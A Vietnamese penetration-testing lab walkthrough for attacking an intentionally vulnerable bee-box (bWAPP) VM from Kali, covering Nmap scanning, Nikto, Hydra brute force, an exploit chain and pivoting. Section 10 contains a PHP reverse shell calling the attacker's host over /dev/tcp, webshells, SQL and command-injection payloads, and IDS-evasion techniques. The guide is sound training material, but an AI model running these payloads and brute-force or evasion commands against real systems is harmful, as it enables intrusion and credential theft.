# KỊCH BẢN PENTEST LAB: KALI LINUX ↔ BEE-BOX (bWAPP)

> **Môi trường:** VMware Workstation — 2 VM: `kali_01` (attacker) và `bee-box v1.6` (victim)
> **Trọng tâm:** khai thác tối đa sức mạnh của **Nmap** (discovery → port scan → service/version → OS fingerprint → NSE → evasion → pivot)
> **Tool phụ:** **Nikto** (web server scan) + **Hydra** (credential attack)
> **Thời lượng dự kiến:** 2.5 – 3 giờ
> **Mục đích:** học tập/huấn luyện trên lab tự dựng. Chỉ tấn công máy mình sở hữu.

---

## 0. CẢNH BÁO PHẠM VI (RULES OF ENGAGEMENT)

| Hạng mục | Nội dung |
|---|---|
| Trong phạm vi | `192.168.91.0/24` (VMnet1 – host-only), cụ thể IP của bee-box |
| Ngoài phạm vi | Mọi dải mạng khác, Internet, máy host, các VM không liên quan |
| Hành vi cấm | Tấn công DoS, scan dải IP ngoài lab, dùng exploit phá hỏng VM |
| Điều kiện | Đã snapshot bee-box trước khi bắt đầu |
| Nguyên tắc | Ghi log toàn bộ, không sửa dữ liệu, không cài backdoor tồn tại lâu |

**Trước khi bắt đầu — BẮT BUỘC:**

1. Trong VMware: `bee-box` → **Edit settings → Network Adapter → Custom: VMnet1 (Host-only)**.
   (File `bee-box.vmx` hiện đang để `bridged`; nếu giữ bridged, bee-box có thể lọt ra LAN thật → sai phạm vi.)
2. Snapshot: `VM → Snapshot → Take Snapshot…` đặt tên `CLEAN-BEFORE-PENTEST`.
3. Kiểm tra 2 máy thông nhau:

```bash
# Trên Kali
ip -brief addr show
# Kỳ vọng: eth0 = 192.168.91.128/24 (hoặc .129/.130...)

ping -c 2 192.168.91.130        # IP bee-box (xác định lại bằng nmap ở Phase 1)
```

> Toàn bộ kịch bản dùng biến `TARGET`. Ví dụ dưới đây giả định `TARGET=192.168.91.130`.
> Nếu IP khác: `export TARGET=<ip_thuc_te>` rồi thay trong các lệnh.

```bash
export TARGET=192.168.91.130
export LHOST=192.168.91.128      # IP Kali
mkdir -p ~/pentest/loot && cd ~/pentest
```

---

## 1. BẢN ĐỒ KỊCH BẢN (8 PHASE)

```
┌──────────────────────────────────────────────────────────────────────┐
│ P1  Host Discovery        nmap -sn / -PR / -PS / -PE / -PU            │
│ P2  Port Scanning         -sS, -sT, -sU, -sA, -p-, -F, -T4            │
│ P3  Service & Version     -sV --version-all, -sR, banner              │
│ P4  OS Fingerprint        -O --osscan-guess                           │
│ P5  NSE Enumeration       default / safe / http-* / mysql-* / ssh-*   │
│ P6  NSE Vulnerability     --script vuln, http-vuln-*, ssl-*           │
│ P7  Web & Credential      Nikto + Hydra (SSH/MySQL/HTTP-form)         │
│ P8  Exploit → Privesc      bWAPP chain → shell → root → pivot (nmap)  │
└──────────────────────────────────────────────────────────────────────┘
        ↓ mỗi phase đều ghi log: -oA loot/<phase>
```

**Nguyên tắc vàng khi scan:**
`Discovery → TCP nhanh → TCP toàn bộ → UDP → Version → OS → NSE an toàn → NSE vuln → Web sâu`
Không bao giờ nhảy thẳng vào `--script vuln` khi chưa có bản đồ port/service: vừa chậm, vừa dễ bỏ sót, vừa ồn ào.

### 1.1. Bộ file đi kèm (chạy được ngay)

| File | Chạy ở đâu | Chức năng |
|---|---|---|
| `README.md` | — | Kịch bản chi tiết + giải thích từng flag (tài liệu này) |
| `01_nmap_scan.sh` | Kali | Toàn bộ 6 phase Nmap, tự lưu `loot/nmap_<time>/` |
| `02_web_and_creds.sh` | Kali | Nikto + curl probe + Hydra (brute mặc định TẮT) |
| `03_pivot_privesc.sh` | bee-box (`local`) / Kali (`pivot`) | Checklist privesc & Nmap xuyên SOCKS |

```bash
cd /path/to/pentest-lab
chmod +x *.sh

export TARGET=192.168.91.130

sudo ./01_nmap_scan.sh "$TARGET"                 # ~15-25 phút (full port + UDP)
./02_web_and_creds.sh "$TARGET"                  # Nikto + probe path
CONFIRM_BRUTE=YES BRUTE=ssh ./02_web_and_creds.sh "$TARGET"   # chỉ khi được phép

# Sau khi có shell trên bee-box:
./03_pivot_privesc.sh local
# Trên Kali, pivot Nmap vào mạng nội bộ phía sau bee-box:
sudo ./03_pivot_privesc.sh pivot "$TARGET" 10.0.0.0/24
```

---

## 2. PHASE 1 — HOST DISCOVERY (tìm bee-box)

### 2.1. Quét ping cả dải (chuẩn nhất trong LAN nội bộ)

```bash
sudo nmap -sn 192.168.91.0/24 -oA loot/01_sweep
```

**Giải thích flag**

| Flag | Ý nghĩa |
|---|---|
| `-sn` | Ping scan – **không quét port**, chỉ xác định host sống |
| `-oA loot/01_sweep` | Xuất 3 định dạng cùng lúc: `.nmap` (text), `.xml`, `.gnmap` |

**Cơ chế thực tế:** vì cùng broadcast domain, Nmap tự dùng **ARP request** (`-PR`) → chính xác nhất, không bị firewall ICMP lừa. Output có kèm MAC → nhìn OUI `00:0C:29` là biết VMware.

Kỳ vọng:

```
Nmap scan report for 192.168.91.130
Host is up (0.00042s latency).
MAC Address: 00:0C:29:3E:BA:70 (VMware)
```

→ `00:0C:29:3E:BA:70` chính là MAC trong `bee-box.vmx` ⇒ xác nhận đúng mục tiêu.

### 2.2. Khi `-sn` không thấy host (bị chặn ICMP/ARP filter) — thử từng kiểu probe

```bash
# Chỉ ARP (nhanh nhất, chỉ dùng được trong LAN)
sudo nmap -sn -PR $TARGET

# ICMP Echo (kiểu ping thường)
sudo nmap -sn -PE $TARGET

# ICMP Timestamp (nhiều firewall cho qua)
sudo nmap -sn -PP $TARGET

# TCP SYN ping tới các port hay mở
sudo nmap -sn -PS22,80,443,3306 $TARGET

# TCP ACK ping (đánh lừa firewall stateful)
sudo nmap -sn -PA80,443 $TARGET

# UDP ping (port cao ít bị lọc)
sudo nmap -sn -PU53,161,31338 $TARGET

# Bỏ hẳn discovery, coi như host luôn sống
sudo nmap -Pn $TARGET
```

| Flag | Ý nghĩa |
|---|---|
| `-PR` | ARP ping (LAN) |
| `-PE` / `-PP` / `-PM` | ICMP Echo / Timestamp / Address Mask |
| `-PS<ports>` | TCP SYN ping – gửi SYN, mở = sống |
| `-PA<ports>` | TCP ACK ping – nhận RST = sống (qua được firewall chặn SYN) |
| `-PU<ports>` | UDP ping – nhận ICMP port-unreachable = sống |
| `-Pn` | Skip host discovery, scan thẳng (dùng khi host chặn hết probe) |

> **Điểm thi:** giải thích được "vì sao `-Pn` làm scan chậm hơn nhưng không bỏ sót host" và "ARP chỉ hoạt động trong cùng subnet".

---

## 3. PHASE 2 — PORT SCANNING

### 3.1. Quét nhanh 1000 port phổ biến (bước đệm bắt buộc)

```bash
sudo nmap -sS -T4 --top-ports 1000 -Pn --reason -oA loot/02_tcp_top1000 $TARGET
```

| Flag | Ý nghĩa |
|---|---|
| `-sS` | **SYN scan** (half-open): gửi SYN, nhận SYN/ACK = mở, gửi RST huỷ. Nhanh, khó bị log ở app, **cần root** |
| `-T4` | Template `aggressive`: tăng parallelism + giảm timeout (an toàn trong LAN) |
| `--top-ports 1000` | 1000 port xuất hiện nhiều nhất theo thống kê Nmap |
| `-Pn` | Không ping trước (bee-box luôn sống, tránh mất thời gian) |
| `--reason` | In lý do kết luận (`syn-ack`, `reset`, `no-response`) — rất hữu ích khi viết report |

### 3.2. Quét TOÀN BỘ 65535 port TCP (bắt buộc để không sót dịch vụ lạ)

```bash
sudo nmap -sS -p- -T4 -Pn --min-rate 1000 --max-retries 2 \
     --reason -oA loot/02_tcp_all $TARGET
```

| Flag | Ý nghĩa |
|---|---|
| `-p-` | Tương đương `-p 1-65535` |
| `--min-rate 1000` | Gửi tối thiểu 1000 packet/giây → quét full port chỉ ~1 phút trong LAN |
| `--max-retries 2` | Giảm retry để không treo ở port bị drop |
| `--reason` | Lý do trạng thái |

> **Vì sao phải full-port?** bee-box có thể mở dịch vụ ngoài top-1000 (ví dụ Tomcat 8080/8009, AJP, hoặc backdoor port tuỳ biến). Chỉ `-p-` mới chứng minh được "đã bao phủ".

### 3.3. Kỹ thuật scan thay thế (khi `-sS` bị chặn / không có root)

```bash
# TCP Connect scan – dùng syscall connect(), không cần root, bị log ở app
nmap -sT -p 22,80,443,3306 $TARGET

# ACK scan – KHÔNG tìm port mở, mà MAP firewall: unfiltered vs filtered
sudo nmap -sA -p 1-1000 $TARGET

# FIN / NULL / XMAS – bypass firewall không stateful (Windows thường bỏ qua)
sudo nmap -sF -p 22,80,443 $TARGET
sudo nmap -sN -p 22,80,443 $TARGET
sudo nmap -sX -p 22,80,443 $TARGET

# Scan theo giao thức IP (không phải port) – thấy ICMP/IGMP/GRE...
sudo nmap -sO $TARGET

# Idle scan – cực kỳ ẩn danh, dùng 1 host "zombie" trung gian
sudo nmap -sI <zombie_ip> $TARGET
```

| Flag | Ý nghĩa / khi nào dùng |
|---|---|
| `-sT` | Connect scan, không cần root, ồn ào hơn `-sS` |
| `-sA` | ACK scan → phát hiện firewall/IDS và rule lọc |
| `-sF/-sN/-sX` | FIN/NULL/XMAS – lách firewall stateless |
| `-sO` | IP protocol scan |
| `-sI` | Idle/zombie scan – không gửi packet từ IP thật |

### 3.4. Quét UDP (đừng bỏ qua — bee-box có thể có DNS/rpcbind/SNMP)

```bash
sudo nmap -sU --top-ports 50 -T4 -Pn --reason -oA loot/02_udp_top50 $TARGET
```

| Flag | Ý nghĩa |
|---|---|
| `-sU` | UDP scan – chậm vì UDP không có handshake; Nmap phải chờ ICMP unreachable hoặc timeout |
| `--top-ports 50` | Chỉ 50 port UDP phổ biến (53, 67, 111, 123, 137, 138, 161, 500, 1900…) để tiết kiệm thời gian |

Kỳ vọng bee-box:

```
PORT     STATE         SERVICE
53/udp   open|filtered domain
111/udp  open          rpcbind
```

> `open|filtered` = không có phản hồi ⇒ không phân biệt được mở hay bị lọc. Đó là bản chất UDP, hãy giải thích như vậy trong report.

### 3.5. Bảng tổng hợp kỳ vọng dịch vụ bee-box

| Port | Dịch vụ | Ghi chú |
|---|---|---|
| 22/tcp | OpenSSH | `bee/bug`, `root/bug` (mặc định của box) |
| 80/tcp | Apache + PHP | bWAPP tại `/bWAPP/`, phpMyAdmin tại `/phpmyadmin/` |
| 443/tcp | HTTPS | bWAPP bản SSL |
| 3306/tcp | MySQL | `root/bug` |
| 111/tcp,udp | rpcbind | thường đi kèm NFS |
| 8080/tcp | (tuỳ biến) | nếu có Tomcat → kiểm tra AJP/manager |

> Kết quả thực tế có thể khác — hãy luôn dùng output thật của bạn, bảng này chỉ để đối chiếu.

---

## 4. PHASE 3 — SERVICE / VERSION DETECTION

```bash
sudo nmap -sV --version-all -sC -p 22,80,443,3306,111 \
     --script=banner -oA loot/03_version $TARGET
```

| Flag | Ý nghĩa |
|---|---|
| `-sV` | Dò banner + probe để đoán **sản phẩm + version** |
| `--version-all` | Intensity 9: thử **mọi** probe (chậm nhưng chính xác nhất) |
| `-sC` | Chạy nhóm script `default` (an toàn, không phá) |
| `--script=banner` | Chỉ lấy banner thô, đối chiếu với `-sV` |

**Các mức intensity (nên biết để chọn):**

| Flag | Intensity | Dùng khi |
|---|---|---|
| `--version-light` | 2 | scan nhanh diện rộng |
| (mặc định) | 7 | cân bằng |
| `--version-all` | 9 | cần chính xác để tra CVE |

```bash
# RPC services (nếu có rpcbind/NFS)
sudo nmap -sV -sR -p 111 $TARGET

# IPv6 (nếu lab bật)
sudo nmap -6 -sV -p 22,80,443 <ipv6_target>
```

Kỳ vọng:

```
22/tcp   open  ssh      OpenSSH 5.3p1 (Ubuntu-1ubuntu2)
80/tcp   open  http     Apache httpd 2.2.14 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.2.14
3306/tcp open  mysql    MySQL 5.1.73
```

> **Giá trị thực tế:** `Apache 2.2.14` / `OpenSSH 5.3p1` / kernel Ubuntu 10.04 → tra `searchsploit apache 2.2` ra ngay một loạt CVE cũ. Đây là lý do `-sV` quan trọng hơn cả việc "thấy port mở".

---

## 5. PHASE 4 — OS FINGERPRINT

```bash
sudo nmap -O --osscan-guess --max-os-tries 2 -p 22,80,443,3306 \
     -oA loot/04_os $TARGET
```

| Flag | Ý nghĩa |
|---|---|
| `-O` | Bật OS detection: phân tích TCP/IP stack (TTL, window size, options, ISN…) |
| `--osscan-guess` | Đoán mạnh tay khi không khớp chính xác 100% |
| `--max-os-tries 2` | Giới hạn số lần thử (mặc định 5) để nhanh hơn |
| `--osscan-limit` | Chỉ thử OS nếu tìm được ≥1 port mở và ≥1 port đóng (tiết kiệm thời gian) |

Kỳ vọng: `Linux 2.6.32 - 2.6.38` / `Linux 2.6.x`.

**Mẹo tăng độ chính xác:** cần ít nhất 1 port **mở** + 1 port **đóng**. Nếu mọi port đều filtered, thêm `--osscan-guess` và chấp nhận kết quả "yếu".

---

## 6. PHASE 5 — NSE ENUMERATION (trái tim của kịch bản)

### 6.1. Cơ chế NSE cần nắm

- Script nằm ở `/usr/share/nmap/scripts/` (Kali), đuôi `.nse`.
- `-sC` = `--script=default` (nhóm an toàn, không gây hại).
- Có thể lọc theo **category**, theo **tên**, hoặc **biểu thức logic**:

```bash
nmap --script-help "http-*"                       # xem mô tả
ls /usr/share/nmap/scripts | grep -i mysql        # tìm script
sudo nmap --script-updatedb                       # cập nhật DB (sau khi thêm script)
```

Các category chính: `default`, `safe`, `discovery`, `version`, `auth`, `brute`, `intrusive`, `vuln`, `exploit`, `malware`, `fuzzer`, `dos`, `broadcast`, `external`.
**`intrusive`/`dos`/`brute`/`exploit` phải cân nhắc trước khi chạy** — có thể làm sập dịch vụ hoặc khoá tài khoản.

### 6.2. Nhóm DEFAULT (an toàn, chạy đầu tiên)

```bash
sudo nmap -sV -sC -p 22,80,443,3306 -oA loot/05_nse_default $TARGET
```

### 6.3. Nhóm HTTP — trọng tâm vì bee-box là web app

```bash
sudo nmap -sV -p 80,443 --script \
"http-title,http-headers,http-methods,http-server-header,http-robots.txt,\
http-enum,http-git,http-config-backup,http-backup-finder,http-php-version,\
http-cookie-flags,http-security-headers,http-cors,http-auth,\
http-phpmyadmin-dir-traversal,http-webdav-scan,http-put,\
http-userdir-enum,http-trace" \
-oA loot/05_nse_http $TARGET
```

| Script | Tác dụng |
|---|---|
| `http-title` | Lấy `<title>` → nhận diện app (bWAPP / phpMyAdmin / DVWA) |
| `http-headers` | Liệt kê header → lộ `Server`, `X-Powered-By`, thiếu `X-Frame-Options` |
| `http-methods` | Kiểm tra `OPTIONS` → phát hiện `PUT`/`DELETE`/`TRACE` nguy hiểm |
| `http-enum` | Brute các path phổ biến: `/phpmyadmin/`, `/bWAPP/`, `/admin/`, `/server-status` (dùng wordlist `nmap/nselib/data/http-fingerprints.lua`) |
| `http-robots.txt` | Đọc `robots.txt` → lộ path ẩn |
| `http-git` | Phát hiện `.git/` bị public → lộ source |
| `http-config-backup` | Tìm `config.php.bak`, `wp-config.old`… |
| `http-backup-finder` | Tìm file backup (`index.php~`, `.swp`, `.zip`) |
| `http-php-version` | Đoán version PHP → tra CVE |
| `http-cookie-flags` | Kiểm tra `HttpOnly`/`Secure` (finding cấu hình) |
| `http-security-headers` | Kiểm tra CSP, HSTS, X-Frame-Options |
| `http-cors` | Phát hiện `Access-Control-Allow-Origin: *` |
| `http-auth` | Liệt kê realm/cơ chế auth |
| `http-phpmyadmin-dir-traversal` | Thử LFI/`../` trên phpMyAdmin cũ |
| `http-webdav-scan` | Phát hiện WebDAV → có thể `PUT` shell |
| `http-put` | Thử upload file qua PUT |
| `http-userdir-enum` | Enumerate `/~user/` |
| `http-trace` | Kiểm tra TRACE (XST) |

### 6.4. Nhóm MySQL (port 3306)

```bash
sudo nmap -sV -p 3306 --script \
"mysql-info,mysql-empty-password,mysql-enum,mysql-variables" \
-oA loot/05_nse_mysql $TARGET
```

| Script | Tác dụng |
|---|---|
| `mysql-info` | Version, protocol, capability, thread ID |
| `mysql-empty-password` | Thử `root` **không mật khẩu** (rất hay gặp trên box lab) |
| `mysql-enum` | Liệt kê user/DB qua lỗi response |
| `mysql-variables` | Đọc biến server (`secure_file_priv`, `datadir`…) |

```bash
# Có credential (root/bug) → đọc sâu hơn
sudo nmap -p 3306 --script mysql-databases,mysql-users,mysql-audit \
     --script-args 'mysqluser=root,mysqlpass=bug' $TARGET

# Kiểm tra user yếu (intrusive)
sudo nmap -p 3306 --script mysql-brute \
     --script-args 'mysql-brute.userdb=/usr/share/nmap/nselib/data/usernames.lst' $TARGET
```

> **Lưu ý đạo đức:** `mysql-brute` sẽ khoá tài khoản nếu cấu hình `max_connect_errors` thấp → chỉ chạy trên lab, có snapshot.

### 6.5. Nhóm SSH

```bash
sudo nmap -p 22 --script \
"ssh-hostkey,ssh-auth-methods,ssh2-enum-algos,ssh-publickey-acceptance" \
-oA loot/05_nse_ssh $TARGET
```

| Script | Tác dụng |
|---|---|
| `ssh-hostkey` | Lấy fingerprint host key (dùng để nhận diện box, so sánh MITM) |
| `ssh-auth-methods` | Xem server cho `password` / `publickey` → quyết định có brute được không |
| `ssh2-enum-algos` | Liệt kê thuật toán yếu (CBC, `diffie-hellman-group1-sha1`) → finding |
| `ssh-publickey-acceptance` | Kiểm tra key nào được chấp nhận |

### 6.6. Nhóm FTP / SMB / SSL / khác (chạy nếu port tương ứng mở)

```bash
# FTP
sudo nmap -p 21 --script "ftp-anon,ftp-syst,ftp-brute" -oA loot/05_nse_ftp $TARGET

# SMB (nếu có Samba)
sudo nmap -p 139,445 --script \
"smb-os-discovery,smb-enum-shares,smb-enum-users,smb2-security-mode,smb-vuln-*" \
-oA loot/05_nse_smb $TARGET

# SSL/TLS (port 443)
sudo nmap -p 443 --script \
"ssl-cert,ssl-enum-ciphers,ssl-dh-params,ssl-heartbleed,ssl-poodle,ssl-ccs-injection" \
-oA loot/05_nse_ssl $TARGET

# RPC/NFS
sudo nmap -p 111 --script "rpcinfo,nfs-ls,nfs-showmount,nfs-statfs" \
     --script-args 'nfs.version=3' -oA loot/05_nse_nfs $TARGET
```

### 6.7. Script "tất cả nhóm an toàn" (một phát bao quát)

```bash
sudo nmap -sV -p 22,80,443,3306 \
     --script "default or safe or discovery or version" \
     --script-timeout 60s -oA loot/05_nse_safe_all $TARGET
```

> `--script-timeout 60s` chặn 1 script treo làm hỏng cả scan.

---

## 7. PHASE 6 — VULNERABILITY SCANNING BẰNG NSE

```bash
sudo nmap -sV -p 22,80,443,3306 --script vuln \
     --script-timeout 90s -oA loot/06_nse_vuln $TARGET
```

`--script vuln` = chạy toàn bộ script category **vuln** (tương đương `http-vuln-*`, `ssl-*`, `smb-vuln-*`…).
Kỳ vọng với bee-box (Apache/PHP cũ):

```
| http-vuln-cve2012-1823:
|   VULNERABLE: PHP-CGI query string parameter injection
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-1823
| http-shellshock:
|   VULNERABLE: GNU Bash "Shellshock"
|     State: LIKELY VULNERABLE
| http-csrf / http-stored-xss / http-dom-based-xss:
|   Các form thiếu token / reflected XSS (bee-box cố tình dính)
```

Chạy riêng từng nhóm để report gọn hơn:

```bash
# SQLi / XSS / CSRF trên web app
sudo nmap -p 80 --script \
"http-sql-injection,http-stored-xss,http-dom-based-xss,http-csrf" \
     --script-args 'http-sql-injection.maxdepth=3' \
     -oA loot/06_nse_webapp $TARGET

# Upload / WebDAV
sudo nmap -p 80 --script "http-fileupload-exploiter,http-webdav-scan,http-put" \
     -oA loot/06_nse_upload $TARGET

# Apache cụ thể
sudo nmap -p 80 --script "http-vuln-cve2011-3192,http-vuln-cve2011-3368,\
http-vuln-cve2012-1823,http-vuln-cve2017-5638" -oA loot/06_nse_apache $TARGET
```

| Script | CVE / ý nghĩa |
|---|---|
| `http-vuln-cve2011-3192` | Apache Range header DoS (Apache ≤ 2.2.19) |
| `http-vuln-cve2011-3368` | Apache reverse proxy SSRF |
| `http-vuln-cve2012-1823` | **PHP-CGI argument injection → RCE** (PHP < 5.3.12/5.4.2) |
| `http-vuln-cve2017-5638` | Struts2 RCE (nếu có Tomcat/Struts) |
| `http-fileupload-exploiter` | Thử upload file độc hại vào form upload |
| `http-shellshock` | Bash Shellshock qua CGI |

> **Đọc kết quả cho đúng:** `State: VULNERABLE` là chắc chắn; `LIKELY VULNERABLE` là dấu hiệu cần verify thủ công bằng curl/browser. Không bao giờ đưa `LIKELY` vào report như sự thật đã khai thác.

---

## 8. PHASE 7 — TOOL PHỤ #1: NIKTO (web server scan)

Nikto bổ sung cho Nmap ở chỗ: kiểm tra **cấu hình sai**, **file mặc định**, **version lỗi thời**, và ~6700 mẫu path — thứ mà Nmap không làm sâu bằng.

```bash
nikto -h http://$TARGET -o loot/07_nikto_http.txt -Format txt -maxtime 10m
nikto -h https://$TARGET -ssl -o loot/07_nikto_https.txt -Format txt
```

| Flag | Ý nghĩa |
|---|---|
| `-h` | Host/URL mục tiêu |
| `-ssl` | Dùng HTTPS |
| `-o` + `-Format` | Ghi report (`txt`, `html`, `csv`, `xml`) |
| `-maxtime` | Giới hạn thời gian (tránh treo) |
| `-Tuning` | Chọn nhóm test: `1` file thú vị, `2` cấu hình sai, `3` lộ info, `4` injection, `5` file ngoài webroot, `b` cấu hình, `d` version, `e` DB… |
| `-Cgidirs all` | Kiểm tra cả thư mục CGI |
| `-id bee:bug` | Basic auth (nếu cần) |

Ví dụ có tuning (khuyến nghị cho lab):

```bash
nikto -h http://$TARGET -Tuning 123bde -Cgidirs all \
      -o loot/07_nikto_tuned.txt -Format txt -maxtime 15m
```

```bash
# Tăng tốc / đổi UA / qua proxy (nếu muốn học evasion)
nikto -h http://$TARGET -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
      -Pause 0 -o loot/07_nikto_ua.txt
```

Kỳ vọng (bee-box):

```
+ Server: Apache/2.2.14 (Ubuntu)
+ /phpmyadmin/: phpMyAdmin directory found.
+ /bWAPP/: Web application found (bWAPP).
+ /icons/README: Apache default file found.
+ /server-status: Apache status page exposed.   ← cấu hình sai
+ OSVDB-877: HTTP TRACE method is active → XST
+ /bWAPP/db/: directory indexing enabled
```

> **Cách dùng trong report:** mỗi dòng `+` là 1 "observation"; nhóm lại thành finding (Info Leak / Misconfiguration / Outdated Component). Đừng copy nguyên 200 dòng Nikto vào report.

---

## 9. PHASE 7b — TOOL PHỤ #2: HYDRA (credential attack)

Chỉ dùng sau khi `ssh-auth-methods` cho thấy `password` được bật, và **luôn** có snapshot.

### 9.1. SSH

```bash
hydra -l bee -P /usr/share/wordlists/rockyou.txt \
      ssh://$TARGET -t 4 -V -f -o loot/07_hydra_ssh_bee.txt
```

| Flag | Ý nghĩa |
|---|---|
| `-l bee` | 1 username cố định (`-L file` nếu nhiều user) |
| `-P file` | Wordlist password (`-p pass` nếu 1 pass) |
| `-t 4` | 4 kết nối song song (SSH dễ bị drop nếu cao) |
| `-V` | Hiện từng lần thử (verbose) |
| `-f` | Dừng ngay khi tìm được |
| `-o` | Ghi kết quả |
| `-e nsr` | Thử thêm: `n` null, `s` = username làm password, `r` = reverse |

> `rockyou.txt` trên Kali thường nén: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` (nếu chưa có).

```bash
# Thử nhanh các mật khẩu "lab-default" trước khi quét wordlist lớn
hydra -l root -p bug ssh://$TARGET -t 2 -V
hydra -l bee  -p bug ssh://$TARGET -t 2 -V
```

### 9.2. MySQL

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      mysql://$TARGET -t 4 -V -f -o loot/07_hydra_mysql.txt
```

### 9.3. HTTP POST form (bWAPP login)

Form login của bWAPP: `POST /bWAPP/login.php` với các field `login`, `password`, `security_level`, `form=submit`; chuỗi báo lỗi chứa `Invalid username or password`.

```bash
hydra -l bee -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid username or password" \
  -t 16 -V -f -o loot/07_hydra_bwapp.txt
```

| Flag | Ý nghĩa |
|---|---|
| `http-post-form` | Module gửi POST |
| `"path:body:fail_string"` | `^USER^`/`^PASS^` là placeholder; chuỗi cuối là **dấu hiệu THẤT BẠI** |
| `-t 16` | HTTP chịu được song song cao hơn SSH |

> Nếu form dùng CSRF token, Hydra sẽ fail toàn bộ → phải dùng `Burp Intruder`/`sqlmap` hoặc script Python. Ghi nhận đây là "control tốt" trong report.

### 9.4. FTP (nếu mở)

```bash
hydra -l bee -P /usr/share/wordlists/rockyou.txt ftp://$TARGET -t 4 -V -f
```

> **Giới hạn thời gian:** luôn đặt `-t` thấp với SSH/MySQL, và ưu tiên danh sách nhỏ `top1000` trước để tránh chạy 3 tiếng vô ích.

---

## 10. PHASE 8 — EXPLOIT CHAIN & PRIVESC (thủ công, có kiểm soát)

### 10.1. Chuỗi khai thác bWAPP (đúng thiết kế của lab)

1. **Truy cập** `http://$TARGET/bWAPP/` → login `bee/bug`.
2. Trong portal: bấm **`here`** để set `security_level = low`.
3. Chọn các bài:

| Bài (bWAPP) | Payload gợi ý | Mục đích |
|---|---|---|
| SQL Injection (Search) | `' OR 1=1-- -` | dump toàn bộ bảng `users`, `blog` |
| SQL Injection (Login) | `' or 1=1#` | bypass auth |
| OS Command Injection | `; id` / `; uname -a` | RCE mức OS |
| Unrestricted File Upload | upload `shell.php` | webshell |
| PHP Code Injection | `<?php system($_GET['c']); ?>` | RCE |
| XSS Reflected/Stored | `<script>alert(1)</script>` | chứng minh XSS |
| LFI | `../../../../etc/passwd` | đọc file hệ thống |
| SSRF | `http://127.0.0.1:3306` | quét nội bộ qua app |
| Insecure DOR | đổi `?id=1` → `2` | IDOR |

4. **Reverse shell** (thay vì webshell mù):

```bash
# Kali
nc -lvnp 4444
```

```php
// shell.php upload lên bee-box
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.91.128/4444 0>&1'"); ?>
```

```bash
# Sau khi có shell
id; hostname; uname -a
```

> **Fallback nếu `exec` bị disable:** dùng webshell đơn giản `<?php echo shell_exec($_GET['c']); ?>` rồi gọi `?c=id`, hoặc upload `.php` chứa `passthru`.

### 10.2. Privilege Escalation trên bee-box

```bash
# 1) Thông tin cơ bản
id; sudo -l; uname -a; cat /etc/issue; cat /etc/passwd | grep -v nologin

# 2) SUID
find / -perm -4000 -type f 2>/dev/null

# 3) Cron / writable
ls -la /etc/cron*; find / -writable -type f 2>/dev/null | head -50

# 4) Kernel exploit
searchsploit linux kernel 2.6.38
searchsploit ubuntu 10.04 privilege escalation
```

Các đường nâng quyền "kinh điển" của bee-box (đúng theo README của box):

| Đường | Cách làm | Ghi chú học tập |
|---|---|---|
| Credential mặc định | `su - root` → `bug` | Box cố tình để `root/bug` |
| MySQL root | `mysql -uroot -pbug` → `SELECT ... INTO OUTFILE '/var/www/shell.php'` | Ghi webshell bằng quyền MySQL |
| sudo misconfig | `sudo -l` → xem lệnh nào chạy được `NOPASSWD` | Leo thang qua binary cho phép |
| Kernel cũ | Compile exploit từ `searchsploit -m` | Chỉ khi các cách trên fail |

> **Điểm cần nêu trong report:** "default credentials" không phải lỗ hổng kỹ thuật mà là **lỗi cấu hình/vận hành** — nhưng hậu quả tương đương Critical.

### 10.3. Pivot: dùng chính Nmap từ host bị chiếm / qua tunnel

Đây là phần "khai thác triệt để Nmap": chứng minh Nmap dùng được trong **post-exploitation**.

**Cách A — Nmap chạy trên bee-box (nếu có binary):**

```bash
# Trong shell www-data / bee
which nmap || ls /usr/bin/nmap
nmap -sn 192.168.91.0/24 -oG - | grep Up
nmap -sT -p 22,80,445,3306 192.168.91.0/24 --open
```

**Cách B — Nmap từ Kali xuyên qua SOCKS proxy của bee-box (khuyến nghị):**

```bash
# 1) Tạo tunnel SSH dynamic (dùng credential đã có)
ssh -D 1080 -N -f bee@$TARGET

# 2) Cấu hình proxychains
sudo tee -a /etc/proxychains4.conf <<'EOF'
socks5 127.0.0.1 1080
EOF
```

```bash
# 3) Nmap qua proxy — BẮT BUỘC -sT (SYN không đi qua SOCKS được) và -Pn
sudo proxychains4 nmap -sT -Pn -n -p 22,80,443,3306 10.0.0.0/24 --open

# 4) Nếu chỉ cần 1 host nội bộ
sudo proxychains4 nmap -sT -Pn -n -sV -p- 10.0.0.10
```

| Điểm kỹ thuật | Giải thích |
|---|---|
| Phải dùng `-sT` | SYN scan cần raw socket → không tunnel qua SOCKS được |
| Phải `-Pn` | ICMP/host discovery không đi qua proxy |
| `-n` | Không resolve DNS (DNS sẽ đi ra ngoài tunnel) |
| `proxychains4` | Hook `connect()` của libc → chuyển mọi kết nối TCP qua SOCKS |

**Cách C — SSH local port forward cho 1 dịch vụ:**

```bash
ssh -L 8080:127.0.0.1:80 bee@$TARGET
# rồi trình duyệt http://127.0.0.1:8080
```

---

## 11. PHASE 9 — EVASION / FIREWALL TEST (tuỳ chọn, chỉ trong lab)

Mục đích học: hiểu **vì sao** scan có thể bị chặn, và Nmap lách thế nào.

```bash
# Fragment packet (chia nhỏ TCP header) – né firewall/IDS đọc header đơn giản
sudo nmap -sS -f -p 80,443 $TARGET
sudo nmap -sS -ff --mtu 8 -p 80,443 $TARGET

# Decoy: trộn IP thật với 10 IP giả → log của victim đầy IP rác
sudo nmap -sS -D RND:10 -p 80,443 $TARGET

# Giả source port tin cậy (53 DNS, 80, 443)
sudo nmap -sS --source-port 53 -p 3306 $TARGET

# Đổi MAC (chỉ hiệu quả trong LAN)
sudo nmap -sS --spoof-mac 0 -p 80 $TARGET          # MAC ngẫu nhiên
sudo nmap -sS --spoof-mac Apple -p 80 $TARGET

# Thêm padding để đổi kích thước packet
sudo nmap -sS --data-length 50 -p 80 $TARGET

# Làm chậm để né threshold IDS
sudo nmap -sS -T2 --scan-delay 1s --max-retries 1 -p 1-100 $TARGET

# Xem gói tin thật sự gửi đi (học TCP handshake)
sudo nmap -sS -p 80 --packet-trace $TARGET

# Traceroute tích hợp
sudo nmap -sS -p 80 --traceroute $TARGET
```

